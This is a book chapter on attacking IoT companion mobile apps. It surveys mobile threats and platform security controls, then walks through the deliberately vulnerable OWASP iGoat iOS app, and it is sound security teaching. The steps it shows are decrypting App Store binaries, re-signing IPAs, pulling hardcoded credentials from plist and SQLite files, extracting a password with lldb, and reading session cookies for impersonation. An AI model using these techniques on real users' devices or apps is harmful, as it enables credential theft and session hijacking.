<html><head></head><body><div id="sbo-rt-content"><section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" title="335" id="Page_335"/>14</span><br/>
<span class="ChapterTitle">Attacking Mobile Applications</span>
</h1>
</header>
<figure class="opener">
<img src="Images/chapterart.png" alt="" width="204" height="204"/>
</figure>
<p class="ChapterIntro">Today, you can use your mobile phone to control practically everything in your home. Imagine that it’s date night with your partner. You’ve prepared dinner, placed it in the oven, and set the cooking instructions on your phone, which you also use to regularly monitor its progress. Then you adjust the ventilation, heating, and cooling, which you also control through an app on your phone. You use your phone to set the TV to play some background music. (You lost your TV remote three years ago and never bothered to look for it.) You also use an app to dim the IoT-enabled lights. Everything is perfect.</p>
<p>But if everything in your house is controlled by your phone, anyone who has compromised your phone can also control your home. In this chapter, we provide an overview of threats and vulnerabilities common to IoT companion mobile apps. Then we perform an analysis of two intentionally insecure apps: the OWASP iGoat app for iOS and the InsecureBankV2 app for Android.</p>
<p><span epub:type="pagebreak" title="336" id="Page_336"/>Because we’re nearing the end of the book, we move quickly through the many vulnerabilities these apps contain, all while referencing many tools and analysis methods. We encourage you to explore each of the tools and techniques in more detail on your own.</p>
<h2 id="h1-500907c14-0001">Threats in IoT Mobile Apps</h2>
<p class="BodyFirst">Mobile apps bring their own ecosystem of threats to the IoT-enabled world. In this section, we’ll walk through a process similar to the threat modeling methodology in Chapter 2 to investigate the main threats that mobile apps introduce against our IoT device.</p>
<p>Because designing the threat model isn’t the main target of this chapter, we won’t perform a full analysis on the components we identify. Instead, we’ll examine the generic threat categories related to mobile devices and then identify the relevant vulnerabilities. </p>
<h3 id="h2-500907c14-0001">Breaking Down the Architecture into Components</h3>
<p class="BodyFirst"><a id="figureanchor14-1" href="#figure14-1">Figure 14-1</a> shows the basic components of an IoT mobile app environment. </p>
<figure>
<img src="Images/f14001.png" alt="f14001" width="750" height="364"/>
<figcaption><p><a id="figure14-1">Figure 14-1:</a> Breaking down the IoT companion mobile app environment</p></figcaption>
</figure>
<p>We separate the mobile app from the platform-specific ecosystem and hardware-related functionalities. We also take into account the process of installing an IoT companion mobile app from an app store, the communication of this app with the IoT device, the vendor’s infrastructure, and any potential third-party service provider.</p>
<h3 id="h2-500907c14-0002"><span epub:type="pagebreak" title="337" id="Page_337"/>Identifying Threats</h3>
<p class="BodyFirst">Now we’ll identify two kinds of threats to mobile app environments: general threats affecting mobile devices and threats affecting the Android and iOS environments specifically. </p>
<h4 id="h3-500907c14-0001">General Mobile Device Threats</h4>
<p class="BodyFirst">The main characteristic of a mobile device is its portability. You can easily carry a phone everywhere, and as a result, it can be easily lost or stolen. Even if people steal phones for the device’s value, adversaries could retrieve sensitive personal data stored in the IoT companion app storage. Or, they could attempt to circumvent a weak or broken authentication control in the app to gain remote access to the associated IoT device. Device owners who remain logged into their IoT companion app accounts will make the process much easier for the attackers. </p>
<p>In addition, mobile devices are usually connected to untrusted networks, such as the random Wi-Fi public hotspots in cafes and hotel rooms, opening the way for a variety of network attacks (such as man-in-the-middle attacks or network sniffing). The IoT companion apps are typically designed to perform network connections to the vendor’s infrastructure, cloud services, and the IoT device. Adversaries can exfiltrate or tamper with the exchanged data if these apps are operating in insecure networks. </p>
<p>The app could also work as a bridge between the IoT device and the vendor’s API, third-party providers, and cloud platforms. These external systems could introduce new threats regarding the protection of the exchanged sensitive data. Attackers can target and exploit publicly accessible services or misconfigured infrastructure components to gain remote access and extract the stored data.</p>
<p>The actual procedure of installing the app might also be susceptible to attacks. Not all IoT companion apps come from an official mobile app store. Many mobile devices let you install apps from third-party stores or apps that aren’t necessarily signed by a valid developer’s certificate. Adversaries exploit this issue to deliver fake versions of the apps that contain malicious functionalities.</p>
<h4 id="h3-500907c14-0002">Android and iOS Threats</h4>
<p class="BodyFirst">Now let’s investigate the threats related to the Android and iOS platforms. <a id="figureanchor14-2" href="#figure14-2">Figure 14-2</a> shows the ecosystems for both platforms.</p>
<p>The software for both platforms includes three layers: a lower layer containing the operating system and interfaces to the device resources; an intermediate layer consisting of the libraries and application frameworks that provide most of the API functionality; and an applications layer, in which the custom apps and a set of system apps reside. The applications layer is responsible for letting the user interact with the mobile device. </p>
<span epub:type="pagebreak" title="338" id="Page_338"/><figure>
<img src="Images/f14002.png" alt="f14002" width="750" height="519"/>
<figcaption><p><a id="figure14-2">Figure 14-2:</a> The Android and iOS ecosystems</p></figcaption>
</figure>
<p>Both platforms offer flexibility to developers and users. For example, users might want to install customized software, such as games and extensions developed by untrusted programmers. Adversaries can trick users into installing malware camouflaged as legit apps, and these apps can interact with an IoT companion app in malicious ways. Additionally, the platforms have rich development environments, but reckless or untrained developers sometimes fail to protect sensitive data by inappropriately using the inherited device-specific security controls, or in certain cases, even disabling them. </p>
<p>Certain platforms, such as Android, suffer from another threat: the quantity of different available devices that run the platform. Many of these devices use outdated versions of the platform operating system that contain known vulnerabilities, introducing a <em>software fragmentation</em> problem. It’s nearly impossible for a developer to keep track of and mitigate all these issues as well as identify them. Also, attackers can identify, target, and abuse ill-protected IoT companion apps by exploiting specific device inconsistencies. For example, APIs related to security controls, such as fingerprint authentication, might not always have the expected behavior due to hardware differences. Multiple manufacturers offer device hardware for Android with different specs and security baseline standards. These vendors are also responsible for maintaining and deploying their own custom <em>Read-Only Memory (ROM),</em> which amplifies the fragmentation problem. Users expect a well-tested, robust, and secure software, but instead, the developers build upon the not-so-reliable API of an unpredictable environment. </p>
<h2 id="h1-500907c14-0002"><span epub:type="pagebreak" title="339" id="Page_339"/>Android and iOS Security Controls</h2>
<p class="BodyFirst">Android and iOS platforms inc<b>l</b>ude a number of security controls that are integrated into critical components of their architectures. <a id="figureanchor14-3" href="#figure14-3">Figure 14-3</a> summarizes these controls. </p>
<figure>
<img src="Images/f14003.png" alt="f14003" width="413" height="750"/>
<figcaption><p><a id="figure14-3">Figure 14-3:</a> Integrated security controls in mobile platform architectures </p></figcaption>
</figure>
<p>The following sections walk through these controls in detail.</p>
<h3 id="h2-500907c14-0003">Data Protection and Encrypted Filesystem</h3>
<p class="BodyFirst">To protect application and user data, the platforms must request consent for interactions between different platform components that affect user data from all the involved entities: the users (through prompts and notifications), the developers (through the use of certain API calls), and the platform (by providing certain functionalities and making sure the system behaves as expected). </p>
<p>To protect data at rest, Android and iOS use <em>file-based encryption (FBE)</em> and <em>full disk encryption (FDE)</em>, and to protect data in transit, the platforms can <span epub:type="pagebreak" title="340" id="Page_340"/>encrypt all transmissions. But both of these controls are left up to developers to implement by using the appropriate parameters in the provided APIs. Versions of Android prior to 7.0 don’t support FBE, and those prior to 4.4 don’t even support FDE. On the iOS platform, you can achieve file encryption even when the device is changing states (for example, if the device is initiated or unlocked or if the user has been authenticated at least once). </p>
<h3 id="h2-500907c14-0004">Application Sandbox, Secure IPC, and Services</h3>
<p class="BodyFirst">Android and iOS also isolate platform components. Both platforms use Unix-style permissions, enforced by the kernel, to achieve a discretionary access control and form an application sandbox. On Android, each app runs as its own user with its own UID. A sandbox also exists for system processes and services, including the phone, Wi-Fi, and Bluetooth stack. Android also has a mandatory access control that dictates the allowed actions per process or set of processes using Security Enhanced Linux (SE-Linux). On the other hand, all iOS apps run as the same user (named “mobile”), but each app is isolated in a sandbox similar to Android’s and given access only to its own part of the filesystem. Additionally, the iOS kernel prohibits apps from making certain system calls. Both platforms embrace an app-specific, permissions-style approach to allow secure interprocess communication and access on shared data (Android Permissions, iOS entitlements). These permissions are declared in the app’s development phase and granted at the installation or execution time. Both platforms also implement similar isolation on the kernel layer by reducing access to drivers or sandboxing the drivers’ code.</p>
<h3 id="h2-500907c14-0005">Application Signatures</h3>
<p class="BodyFirst">Both platforms use app signatures to verify that the applications haven’t been tampered with. The approved developers must generate these signatures before submitting an app to the platform’s official app store, but there are differences in the way that the signature verification algorithm works and the time that the signature validation occurs. In addition, the Android platform allows users to install apps from any developer by enabling the “unknown sources” options setting in the application settings. Android device vendors also install their own custom application store that might not necessarily comply with this restriction. In contrast, the iOS platform only allows you to install apps created by developers who are part of an authorized organization, using enterprise certificates, or who are also the device owners.</p>
<h3 id="h2-500907c14-0006">User Authentication</h3>
<p class="BodyFirst">Both platforms authenticate the user, usually based on knowledge factors (for example, by requesting a PIN, a pattern, or a user-defined password), using biometrics (such as fingerprints, iris scans, or face recognition), or even using behavioral approaches (like unlocking the device in trusted locations or when associating with trusted devices). The authentication <span epub:type="pagebreak" title="341" id="Page_341"/>control typically involves software and hardware components, although some Android devices are equipped with no such hardware component. The developers can verify the existence of this hardware using specialized API calls that the Android platform framework provides. In both platforms, developers can ignore the platform-provided, hardware-backed user authentication or perform their own custom client-side authentication control in the software layer, degrading the security performance. </p>
<h3 id="h2-500907c14-0007">Isolated Hardware Components and Keys Management</h3>
<p class="BodyFirst">Modern devices isolate platform components in the hardware layer to prevent a compromised kernel from having full control of the hardware. They protect certain security-related functionalities, such as key storage and operations, using isolated hardware implementations.  For example, they may use a <em>trusted platform module</em><span class="ColorText" style="color:#222222">, </span><span class="ColorText" style="color:#242729">an isolated hardware component specifically created to perform fixed crypto operations</span><span class="ColorText" style="color:#222222">;</span><span class="ColorText" style="color:#222222"/>a <em>trusted execution environment</em>, a reprogrammable component <span class="ColorText" style="color:#222222">located in a secure area </span>of the main processor; or separate <em>tamper-resistant hardware</em> hosted in <span class="ColorText" style="color:#242729">discrete</span> hardware alongside the main processor. To support financial transactions, certain devices also have a secure element that executes code in the form of Java applets and can securely host confidential data. </p>
<p>Some device vendors use customized implementations of these technologies. For example, the latest Apple devices use the <em>Secure Enclave</em>, a separate hardware component capable of hosting code and data and performing authentication operations. The latest Google devices use a tamper-resistant hardware chip named <em>Titan M</em> with similar capabilities. ARM-based main chipsets support a trusted execution environment named <em>TrustZone</em>, and Intel-based main chipsets support one named <em>SGX</em>. These isolated hardware components implement the platforms’ key storage functionalities. But it’s up to the developers to use the correct API calls to safely leverage the trusted keystores. </p>
<h3 id="h2-500907c14-0008">Verified and Secure Boot</h3>
<p class="BodyFirst">Additionally, both platforms use software components that are verified during the boot phase when the operating system loads. <em>Secure boot</em> verifies the device’s bootloader and the software of certain isolated hardware implementations, initiating a hardware Root of Trust. In Android-based platforms, <em>Android Verified Boot</em> is responsible for verifying the software components, and in iOS-based platforms, <em>SecureRom</em> has that responsibility. </p>
<h2 id="h1-500907c14-0003">Analyzing iOS Applications</h2>
<p class="BodyFirst">In this section, we’ll investigate an open source mobile app for iOS: the OWASP iGoat project (<a href="https://github.com/OWASP/igoat/" class="LinkURL">https://github.com/OWASP/igoat/</a>). Although not an IoT companion app, the iGoat project contains identical business logic <span epub:type="pagebreak" title="342" id="Page_342"/>and uses similar functionalities to many apps for IoT devices. We’ll focus only on uncovering vulnerabilities that might exist in IoT companion apps.</p>
<p>The iGoat mobile app (<a id="figureanchor14-4" href="#figure14-4">Figure 14-4</a>) contains a series of challenges based on common mobile app vulnerabilities. The user can navigate to each challenge and interact with the deliberately vulnerable component to extract hidden secret flags or tamper with the app’s functionality.</p>
<figure>
<img src="Images/f14004.png" alt="f14004" width="373" height="750"/>
<figcaption><p><a id="figure14-4">Figure 14-4:</a> Categories in the iGoat mobile app</p></figcaption>
</figure>
<h3 id="h2-500907c14-0009">Preparing the Testing Environment</h3>
<p class="BodyFirst">To test iGoat, you’ll need an Apple desktop or laptop, which you’ll use to set up an iOS simulator in the Xcode IDE. You can only install Xcode on macOS through the Mac App Store. You should also install the Xcode command line tools using the <code>xcode-select </code>command:</p>
<pre><code>$ <b>xcode-select --install</b></code></pre>
<p>Now create your first simulator using the following <code>xcrun </code>command, which allows you to run the Xcode development tools:</p>
<pre><code>$ <b>xcrun simctl create simulator com.apple.CoreSimulator.SimDeviceType.iPhone-X com.apple.CoreSimulator.SimRuntime.iOS-12-2</b> </code></pre>
<p><span epub:type="pagebreak" title="343" id="Page_343"/>The first parameter, named <code>simctl</code>, allows you to interact with iOS simulators. The <code>create</code> parameter creates a new simulator with the name of the parameter that follows. The last two parameters specify the device type, which in our case is an iPhone X, and the iOS runtime, which is iOS 12.2. You can install other iOS runtimes by opening Xcode, clicking the <b>Preferences</b> option, and then choosing one of the available iOS simulators in the <b>Components</b> tab (<a id="figureanchor14-5" href="#figure14-5">Figure 14-5</a>).</p>
<figure>
<img src="Images/f14005.png" alt="f14005" width="750" height="232"/>
<figcaption><p><a id="figure14-5">Figure 14-5:</a> Installing iOS runtimes</p></figcaption>
</figure>
<p>Boot and open your first simulator using the following commands:</p>
<pre><code>$<b> xcrun simctl boot &lt;simulator identifier&gt; </b>
$ <b>/Applications/Xcode.app/Contents/Developer/Applications/Simulator.app/</b>
<b>Contents/MacOS/Simulator -CurrentDeviceUDID booted</b> </code></pre>
<p>Next, use the <code>git</code> command to download the source code from the repository, navigate to the iGoat application folder, and compile the application for the simulated device using the <code>xcodebuild</code> command. Then install the generated binary in the booted simulator: </p>
<pre><code>$ <b>git clone https://github.com/OWASP/igoat</b>
$ <b>cd</b><b> igoat</b><b>/IGoat</b>
$ <b>xcodebuild -project iGoat.xcodeproj -scheme iGoat -destination "</b><b>id</b><b>=</b><b>&lt;simulator identifier&gt;</b><b>"</b><b> </b>
$<b> xcrun simctl install  booted ~/Library/Developer/Xcode/DerivedData/</b>
<b>iGoat-&lt;application identifier&gt;/Build/Products/Debug-iphonesimulator/iGoat.app</b> </code></pre>
<p>You can find the application identifier either by checking the last lines of the <code>xcodebuild</code> command or by navigating to the <em>~/Library/Developer/Xcode/DerivedData/ </em>folder.</p>
<h3 id="h2-500907c14-0010">Extracting and Re-Signing an IPA</h3>
<p class="BodyFirst">If you already have an iOS device you use for testing with an installed app that you want to examine, you’ll have to extract the app differently. All iOS apps exist in an archive file called an <em>iOS App Store Package (IPA)</em>. In the past, earlier versions of iTunes (up to 12.7.<em>x</em>) permitted users to extract the IPAs for apps acquired through the App Store. Also, in previous iOS versions up <span epub:type="pagebreak" title="344" id="Page_344"/>to 8.3, you could extract an IPA from the local filesystem using software such as iFunBox or the iMazing tool. But these aren’t official methods and might not support the latest iOS platforms. </p>
<p>Instead, use a jailbroken device to extract the app’s folder from the filesystem or attempt to find the application already decrypted by another user in an online repository. For example, to extract the <em>iGoat.app</em> folder from a jailbroken device, navigate to the Applications folder and search for the subfolder that contains the app: </p>
<pre><code>$ <b>cd /var/containers/Bundle/Application/</b></code></pre>
<p>If you installed the application through the App Store, the main binary will be encrypted. To decrypt the IPA from the device memory, use a publicly available tool, such as Clutch (<a href="http://github.com/KJCracks/Clutch/" class="LinkURL">http://github.com/KJCracks/Clutch/</a>):</p>
<pre><code>$ <b>clutch -d &lt;bundle identifier&gt;</b></code></pre>
<p>You might also have an IPA that isn’t signed for your device, either because a software vendor provided it to you or because you’ve extracted this IPA in one of the previously mentioned ways. In this case, the easiest way to install it in your testing device is to re-sign it using a personal Apple developer account with a tool like Cydia Impactor (<a href="http://www.cydiaimpactor.com" class="LinkURL">http://www.cydiaimpactor.com</a><em>/</em>) or node-applesign (<a href="https://github.com/nowsecure/node-applesign/" class="LinkURL">https://github.com/nowsecure/node-applesign/</a>). This method is common for installing apps, such as unc0ver, that perform jailbroken functions.</p>
<h3 id="h2-500907c14-0011">Static Analysis </h3>
<p class="BodyFirst">The first step of our analysis is to examine the created IPA archive file. This bundle is nothing more than a ZIP file, so start by unzipping it using the following command. </p>
<pre><code>$ <b>unzip iGoat.ipa</b>
-- Payload/
---- iGoat.app/
------- <span class="CodeAnnotation">1</span>Info.plist 
------- <span class="CodeAnnotation">2</span>iGoat 
------- ...</code></pre>
<p>The most important files in the unzipped folder are the <em>information property list file</em> (named<em>Info.plist</em><span class="CodeAnnotation">1</span>), which is a structured file that contains configuration information for the application, and the executable file <span class="CodeAnnotation">2</span>, which has the same name as the application. You’ll also see other resource files that live outside of the main application’s executable file.</p>
<p>Open the information property list file. A common suspicious finding here is the existence of registered URL schemes (<a id="figureanchor14-6" href="#figure14-6">Figure 14-6</a>). </p>
<figure>
<img src="Images/f14006.png" alt="f14006" width="738" height="50"/>
<figcaption><p><a id="figure14-6">Figure 14-6:</a> A registered URL scheme in the information property list file </p></figcaption>
</figure>
<p><span epub:type="pagebreak" title="345" id="Page_345"/>A <em>URL scheme</em> mainly allows a user to open a specific app interface from other apps. Adversaries might attempt to exploit these by making the device execute unwanted actions in the vulnerable app when it loads this interface. We’ll have to test the URL schemes for this vulnerability later in the dynamic analysis phase.</p>
<h4 id="h3-500907c14-0003">Inspecting the Property List Files for Sensitive Data</h4>
<p class="BodyFirst">Let’s look at the rest of the property list files (the files with the extension <em>.plist</em>), which store serialized objects and often hold user settings or other sensitive data. For example, in the iGoat app, the <em>Credentials.plist</em> file contains sensitive data related to the authentication control. You can read this file using the Plutil tool, which converts the <em>.plist</em><code/>file to XML: </p>
<pre><code>$ <b>plutil -convert xml1 -o - </b><b>Credentials.plist </b>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;plist version="1.0"&gt;
&lt;string&gt;Secret@123&lt;/string&gt;
&lt;string&gt;admin&lt;/string&gt;
&lt;/plist&gt;</code></pre>
<p>You can use the identified credentials to authenticate in the Data Protection (Rest) category’s Plist Storage challenge in the app functionalities.</p>
<h4 id="h3-500907c14-0004">Inspecting the Executable Binary for Memory Protections</h4>
<p class="BodyFirst">Now we’ll inspect the executable binary and check whether it’s been compiled with the necessary memory protections. To do this, run the object file displaying tool (Otool), which is part of Xcode’s CLI developer tools package: </p>
<pre><code>$<b> otool -l iGoat | grep -A 4 LC_ENCRYPTION_INFO </b>
cmd LC_ENCRYPTION_INFO 
cmdsize 20
cryptoff 16384
cryptsize 3194880
<span class="CodeAnnotationHang">1</span> cryptid 0 
$ <b>otool -hv iGoat</b>
magic 	    cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags MH_MAGIC  ARM     V7          0x00    EXECUTE  35    4048            NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK <span class="CodeAnnotation">2</span> PIE </code></pre>
<p>First, we examine whether the binary has been encrypted in the App Store by investigating <code>cryptid </code><span class="CodeAnnotation">1</span>. If this flag is set to <code>1</code>, the binary is encrypted and you should attempt to decrypt it from the device memory using the approach described earlier in “Extracting and Re-Signing an IPA” on page 343. We also check whether address space layout randomization is enabled by checking whether the PIE flag <span class="CodeAnnotation">2</span> exists in the binary’s header.<em> Address space layout randomization</em> is a technique that randomly arranges the memory address space positions of a process to prevent the exploitation of memory corruption vulnerabilities.</p>
<p><span epub:type="pagebreak" title="346" id="Page_346"/>Using the same tool, check whether <em>stack-smashing protection</em> is enabled. Stack-smashing protection is a technique that detects memory corruption vulnerabilities by aborting a process’s execution if a secret value in the memory stack changes. </p>
<pre><code>$<b> otool -I -v iGoat | grep stack</b>
0x002b75c8   478 ___stack_chk_fail
0x00314030   479 ___stack_chk_guard<span class="CodeAnnotation">1</span>
0x00314bf4   478 ___stack_chk_fail</code></pre>
<p>The <code>__stack_chk_guard</code><span class="CodeAnnotation">1</span> flag indicates that stack-smashing protection is enabled. </p>
<p>Finally, check whether the app is using <em>Automatic Reference Counting (ARC)</em>, a feature that replaces traditional memory management by checking for symbols, such as <code>_objc_autorelease</code>, <code>_objc_storeStrong</code>, and <code>_objc_retain</code>: </p>
<pre><code>$ <b>otool -I -v iGoat | grep _objc_autorelease</b> 
0x002b7f18   715 _objc_autorelease\</code></pre>
<p>The ARC mitigates memory-leak vulnerabilities, which occur when developers fail to free unnecessary allocated blocks and can lead to memory exhaustion issues. It automatically counts the references to the allocated memory blocks and marks blocks with no remaining references for deallocation.</p>
<h4 id="h3-500907c14-0005">Automating Static Analysis</h4>
<p class="BodyFirst">You can also automate your static analysis of the application source code (if it’s available) and the generated binary. Automated static analyzers examine several possible code paths and report potential bugs that could be almost impossible to identify using manual inspection.</p>
<p>For example, you could use astatic analyzer like <code>llvm clang</code> to audit the app’s source code at compile time. This analyzer identifies a number of bug groups, including logic flaws (such as dereferencing null pointers, returning an address to stack-allocated memory, or using undefined results of business logic operations); memory management flaws (such as leaking objects and allocated memory and allocation overflows); dead store flaws (such as unused assignments and initializations); and API usage flaws originating from the incorrect use of the provided frameworks. It’s currently integrated in Xcode, and you can use it by adding the <code>analyze</code> parameter in the build command: </p>
<pre><code>$ <b>xcodebuild  analyze -project iGoat.xcodeproj -scheme iGoat -destination  "name=iPhone X"</b></code></pre>
<p>The analyzer bugs will appear in build log. You could use many other tools to automatically scan the application binary, such as the Mobile Security Framework (MobSF) tool (<a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/" class="LinkURL">https://github.com/MobSF/Mobile-Security-Framework-MobSF/</a>).</p>
<h3 id="h2-500907c14-0012"><span epub:type="pagebreak" title="347" id="Page_347"/>Dynamic Analysis</h3>
<p class="BodyFirst">In this section, we’ll execute the app in the simulated iOS device, test the device’s functionalities by submitting user input, and examine the app’s behavior within the device ecosystem. The easiest approach to this task is to manually examine how the app affects major device components, such as the filesystem and the keychain. This dynamic analysis can reveal insecure data storage and improper platform API usage issues.</p>
<h4 id="h3-500907c14-0006">Examining the iOS File Structure and Its Databases</h4>
<p class="BodyFirst">Let’s navigate to the application folder in the simulated device to examine the file structure that iOS apps use. In iOS platforms, apps can only interact with directories inside the app’s sandbox directory. The sandbox directory contains the <em>Bundle container</em>, which is write-protected and contains the actual executable, and the <em>Data container</em>, which contains a number of subdirectories (such as <em>Documents</em>, <em>Library</em>, <em>SystemData</em>, and <em>tmp</em>) that the app uses to sort its data. </p>
<p>To access the simulated device filesystem, which serves as the root directory for the following sections of the chapter, enter the following command:</p>
<pre><code>$ <b>cd ~/Library/Developer/CoreSimulator/Devices/&lt;simulator identifier&gt;/</b></code></pre>
<p>Next, navigate to the <em>Documents</em> folder, which will initially be empty. To locate the application identifier, you can search for the iGoat app using the <code>find</code> command:</p>
<pre><code>$ <b>find . -name </b><b>*</b><b>iGoat</b><b>*</b>
./data/Containers/Data/Application/&lt;application id&gt;/Library/Preferences/com.swaroop.iGoat.plist
$ <b>cd data/Containers/Data/Application/&lt;application id&gt;/Documents</b></code></pre>
<p>The initially empty folder will be populated with files created dynamically by the application’s different functionalities. For example, by navigating to the Data Protection (Rest) category in the app functionalities, selecting the Core Data Storage challenge, and pressing the Start button, you’ll generate a number of files with the prefix <a href="http://CoreData" class="LinkURL">CoreData</a>. The challenge requires you to inspect those files and recover a pair of stored credentials. </p>
<p>You can also monitor the dynamically created files using the <code>fswatch</code> application, which you can install through one of the available third-party package managers in macOS, such as Homebrew (<a href="https://brew.sh/" class="LinkURL">https://brew.sh/</a>) or MacPorts (<a href="https://www.macports.org/" class="LinkURL">https://www.macports.org/</a>). </p>
<pre><code>$ <b>brew install fswatch</b>
$ <b>fswatch -r ./</b>
/Users/&lt;username&gt;/Library/Developer/CoreSimulator/Devices/&lt;simulator identifier&gt;/data/Containers/Data/Application/&lt;application id&gt; /Documents/CoreData.sqlite</code></pre>
<p>Perform the installation by specifying the Homebrew package manager’s <code>brew</code> binary followed by the <code>install </code>parameter and the name of the <span epub:type="pagebreak" title="348" id="Page_348"/>requested package. Next, use the <code>fswatch</code> binary followed by the <code>-r</code> parameter to recursively monitor the subfolders and the target folder, which in our case is the current directory. The output will contain the full path of any created file.</p>
<p>We’ve already mentioned how to examine the contents of <em>.plist</em> files, so we’ll now focus on these <em>CoreData </em>files. Among other tasks, the <em>CoreData framework</em> abstracts the process of mapping objects to a store, making it easy for developers to save data on the device filesystem in a <code>sqlite </code>database format without having to manage the database directly. Using the <code>sqlite3</code> client, you can load the database, view the database tables, and read the contents of the <code>ZUSER</code> table, which contains sensitive data, such as user credentials:</p>
<pre><code>$ <b>sqlite3 CoreData.sqlite</b>
sqlite&gt; <b>.tables</b>
ZTEST         ZUSER         Z_METADATA    Z_MODELCACHE  Z_PRIMARYKEY
sqlite&gt; select * from ZUSER ;
1|2|1|john@test.com|coredbpassword</code></pre>
<p>You can use the identified credentials later to authenticate in the “Core Data Storage” challenge’s login form. Once you do so, you should receive a success message indicating the completion of the challenge. </p>
<p>A similar vulnerability existed in the SIMATIC WinCC OA Operator application for the iOS platform, which allowed users to control a Siemens SIMATIC WinCC OA facility (such as water supply facilities and power plants) easily via a mobile device. Attackers with physical access to the mobile device were able to read unencrypted data from the app’s directory (<a href="https://www.cvedetails.com/cve/CVE-2018-4847/" class="LinkURL">https://www.cvedetails.com/cve/CVE-2018-4847/</a>). </p>
<h4 id="h3-500907c14-0007">Running a Debugger</h4>
<p class="BodyFirst">It’s also possible to examine an application using a debugger. This technique would reveal the application’s inner workings, including the decryption of passwords or the generation of secrets. By examining these processes, we can usually intercept sensitive information compiled into the application binary and presented at runtime. </p>
<p>Locate the process identifier and attach a debugger, such as <code>gdb</code> or <code>lldb</code>. We’ll use <code>lldb</code> from the command line. It’s the default debugger in Xcode, and you can use it to debug C, Objective-C, and C++ programs. Enter the following to locate the process identifier and attach the <code>lldb</code>debugger.  </p>
<pre><code>$ <b>ps -A | grep iGoat.app</b>
59843 ??         0:03.25 /..../iGoat.app/iGoat
$ <b>lldb</b>
(lldb) <b>process attach --pid 59843</b>
Executable module set to "/Users/.../iGoat.app/iGoat".
Architecture set to: x86_64h-apple-ios-.
(lldb) <b>process continue</b>
Process 59843 resuming</code></pre>
<p><span epub:type="pagebreak" title="349" id="Page_349"/>When you attach the debugger, the process pauses, so you’ll have to continue the execution by using the <code>process continue</code> command. Watch the output as you do so to locate interesting functions that perform security related operations. For example, the following function calculates the password you can use to authenticate in the Runtime Analysis category’s Private Photo Storage challenge in the app’s functionalities:</p>
<pre><code>- <span class="CodeAnnotation">1</span> (NSString *)thePw 
{
    char xored[] = {0x5e, 0x42, 0x56, 0x5a, 0x46, 0x53, 0x44, 0x59, 0x54, 0x55};
    char key[] = "1234567890";
    char pw[20] = {0};  
    for (int i = 0; i &lt; sizeof(xored); i++) {
        pw[i] = xored[i] ^ key[i%sizeof(key)];
    }
    return [NSString stringWithUTF8String:pw]; 
}</code></pre>
<p>To understand what the function does, check the iGoat app’s source code, which you downloaded earlier using the <code>git</code> command. More precisely, look at the <code>thePw</code><span class="CodeAnnotation">1</span> function in the <em>iGoat/Personal Photo Storage/PersonalPhotoStorageVC.m</em> class.</p>
<p>It’s now possible to intentionally interrupt the software execution to this function using a breakpoint to read the calculated password from the app’s memory. To set a breakpoint, use the <code>b </code>command followed by the function name: </p>
<pre><code>(lldb) <b>b thePw </b>
Breakpoint 1: where = iGoat`-[PersonalPhotoStorageVC thePw] + 39 at PersonalPhotoStorageVC.m:60:10, address = 0x0000000109a791cs7
(lldb) 
Process 59843 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
   ...
   59  	- (NSString *)thePw{
-&gt; 60  	    char xored[] = {0x5e, 0x42, 0x56, 0x5a, 0x46, 0x53, 0x44, 0x59, 0x54, 0x55};
   61  	    char key[] = "1234567890";
   62  	    char pw[20] = {0};</code></pre>
<p>After navigating to the corresponding functionality in the simulated app, the app should freeze and a message pointing to the execution step with an arrow should appear in the <code>lldb</code> window.</p>
<p>Now move to the following execution steps using the <code>step</code> command. Continue doing so until you reach the end of the function where the secret password gets decrypted: </p>
<pre><code>(lldb) <b>step </b>
    frame #0: 0x0000000109a7926e iGoat`-[PersonalPhotoStorageVC thePw](self=0x00007fe4fb432710, _cmd="thePw") at PersonalPhotoStorageVC.m:68:12
   65  	        pw[i] = xored[i] ^ key[i%sizeof(key)];
<span epub:type="pagebreak" title="350" id="Page_350"/>   66  	    }	    
-&gt; 68  	    return [NSString stringWithUTF8String:pw]; 
   69  	}
   71  	@e
<span class="CodeAnnotationHang">1</span> (lldb) <b>print pw</b>
<span class="CodeAnnotationHang">2</span> (char [20]) $0 =  "<b>opensesame</b>" </code></pre>
<p>Using the <code>print</code><span class="CodeAnnotation">1</span> command, you can retrieve the decrypted password <span class="CodeAnnotation">2</span>. Learn more about the <code>lldb </code>debugger in <em>iOS Application Security</em> by David Thiel (<a href="https://nostarch.com/iossecurity/" class="LinkURL">https://nostarch.com/iossecurity/</a>).</p>
<h4 id="h3-500907c14-0008">Reading Stored Cookies</h4>
<p class="BodyFirst">Another not so obvious location in which mobile apps usually store sensitive information is the <em>Cookies </em>folder in the filesystem, which contains the HTTP cookies websites use to remember user information. IoT companion apps navigate to and render websites in WebView to present web content to end users. (A discussion of WebView is outside the scope of this chapter, but you can read more about it at the iOS and Android developer pages. We’ll also use WebView in an attack against a home treadmill in Chapter 15.) But many of these sites require user authentication to present personalized content, and as a result, they use HTTP cookies to track the active users’ HTTP sessions. We can search these cookies for authenticated user sessions that could allow us to impersonate the user on these websites and retrieve the personalized content. </p>
<p>The iOS platform stores these cookies in a binary format, often for long periods of time. We can use the BinaryCookieReader (<a href="https://github.com/as0ler/BinaryCookieReader/" class="LinkURL">https://github.com/as0ler/BinaryCookieReader/</a>) tool to decode them in a readable form. To run it, navigate to the <a href="http://Cookies" class="LinkURL">Cookies</a> folder, and then run this Binary Cookie Reader Python script: </p>
<pre><code>$ <b>cd data/Containers/Data/Application/&lt;application-id&gt;/Library/Cookies/</b>
$ <b>python BinaryCookieReader/BinaryCookieReader.py</b> com.swaroop.iGoat.binarycookies 
... 
Cookie : <span class="CodeAnnotation">1</span> sessionKey=dfr3kjsdf5jkjk420544kjkll; domain=www.github.com; path=/OWASP/iGoat; 
            expires=Tue, 09 May 2051;</code></pre>
<p>The tool returns cookies that contain session keys for a website <span class="CodeAnnotation">1</span>. You could use that data to authenticate in the Data Protection (Rest) category’s  Cookie Storage challenge in the app functionalities. </p>
